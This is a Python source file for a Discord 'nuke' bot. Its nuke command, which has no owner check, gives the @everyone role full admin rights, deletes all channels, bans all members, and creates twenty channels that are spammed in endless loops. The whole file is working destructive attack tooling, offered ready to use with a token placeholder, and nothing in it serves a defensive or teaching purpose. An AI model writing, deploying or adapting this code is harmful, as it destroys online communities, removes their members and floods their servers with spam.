import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "Your Token Here"


SPAM_CHANNEL =  ["Spam channel name here"]
SPAM_MESSAGE = [" Spam message here"]


client = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@client.event
async def on_ready():
    print(f"{client.user} is ready!")
    await client.change_presence(activity=discord.Game(name="Hail Yuno"))

# Command to stop the bot
@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

# Nuke command: delete channels, ban users, and create spam channels
@client.command()
async def nuke(ctx):
    await ctx.message.delete()  # Attempt to delete the invoking message
    guild = ctx.guild

    # Give @everyone admin permissions
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except discord.errors.Forbidden:
        print(Fore.RED + "Bot lacks permission to edit @everyone role." + Fore.RESET)
    except Exception as e:
        print(Fore.RED + f"An error occurred while giving @everyone admin: {e}" + Fore.RESET)

    # Delete all channels in the guild
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except discord.errors.Forbidden:
            print(Fore.RED + f"Missing permissions to delete {channel.name}." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"An error occurred while deleting {channel.name}: {e}" + Fore.RESET)

    # Ban all members
    for member in guild.members:
        try:
            await member.ban()
            print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned." + Fore.RESET)
        except discord.errors.Forbidden:
            print(Fore.RED + f"Missing permission to ban {member.name}#{member.discriminator}." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"An error occurred while banning {member.name}: {e}" + Fore.RESET)

    # Create spam channels and start spamming messages
    amount = 20  # Define the number of spam channels you want to create
    for i in range(amount):
        try:
            spam_channel = await guild.create_text_channel(random.choice(SPAM_CHANNEL))
            print(Fore.MAGENTA + f"Created spam channel: {spam_channel.name}" + Fore.RESET)

            # Start spamming in the new channel
            asyncio.create_task(spam_in_channel(spam_channel))  # Asynchronously spam each channel
        except discord.errors.Forbidden:
            print(Fore.RED + "Bot lacks permission to create channels." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"An error occurred while creating channels: {e}" + Fore.RESET)

    print(f"Nuked {guild.name} successfully.")
    return

# Function to spam messages in a channel
async def spam_in_channel(channel):
    while True:
        try:
            await channel.send(random.choice(SPAM_MESSAGE))
            await asyncio.sleep(10)  # Add a delay to avoid rate limits
        except discord.errors.Forbidden:
            print(Fore.RED + f"Bot lacks permission to send messages in {channel.name}." + Fore.RESET)
            break
        except Exception as e:
            print(Fore.RED + f"An error occurred while spamming in {channel.name}: {e}" + Fore.RESET)
            break

client.run(token)
